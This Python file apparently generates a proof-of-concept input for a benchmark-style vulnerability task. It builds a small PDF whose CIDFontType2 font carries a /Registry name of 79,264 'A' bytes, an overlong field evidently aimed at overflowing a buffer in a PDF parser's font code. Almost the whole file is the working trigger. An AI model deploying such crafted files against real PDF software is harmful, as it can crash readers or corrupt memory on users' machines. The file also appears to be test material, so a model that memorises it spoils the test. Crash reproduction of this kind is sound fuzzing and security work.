import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        long_len = 79264
        long_name = b'A' * long_len
        pdf_data = io.BytesIO()
        pdf_data.write(b'%PDF-1.4\n\n')
        obj_offsets = [0] * 7
        obj_offsets[1] = pdf_data.tell()
        pdf_data.write(b'1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n\n')
        obj_offsets[2] = pdf_data.tell()
        pdf_data.write(b'2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n\n')
        obj_offsets[3] = pdf_data.tell()
        pdf_data.write(b'3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>\nendobj\n\n')
        contents = b'BT\n/F1 12 Tf\n100 700 Td\n(Hello World) Tj\nET\n'
        cont_len = len(contents)
        obj_offsets[4] = pdf_data.tell()
        pdf_data.write(f'4 0 obj\n<< /Length {cont_len} >>\nstream\n'.encode('ascii'))
        pdf_data.write(contents)
        pdf_data.write(b'\nendstream\nendobj\n\n')
        obj_offsets[5] = pdf_data.tell()
        pdf_data.write(b'5 0 obj\n<< /Type /Font /Subtype /CIDFontType2 /BaseFont /TestCID\n/CIDSystemInfo << /Registry /')
        pdf_data.write(long_name)
        pdf_data.write(b' /Ordering /Identity /Supplement 0 >>\n /FontDescriptor 6 0 R /DW 1000 /W [0 [1000]] >>\nendobj\n\n')
        obj_offsets[6] = pdf_data.tell()
        pdf_data.write(b'6 0 obj\n<< /Type /FontDescriptor /FontName /TestCID /Flags 32 /FontBBox [-100 -100 1000 1000] /Ascent 800 /Descent -200 /CapHeight 700 /StemV 80 >>\nendobj\n\n')
        startxref = pdf_data.tell()
        pdf_data.write(b'xref\n0 7\n')
        pdf_data.write(b'0000000000 65535 f \n')
        for i in range(1, 7):
            off_str = f'{obj_offsets[i]:010d}'.encode('ascii')
            pdf_data.write(off_str + b' 00000 n \n')
        pdf_data.write(b'trailer\n<< /Size 7 /Root 1 0 R >>\nstartxref\n')
        pdf_data.write(f'{startxref}\n'.encode('ascii'))
        pdf_data.write(b'%%EOF')
        return pdf_data.getvalue()
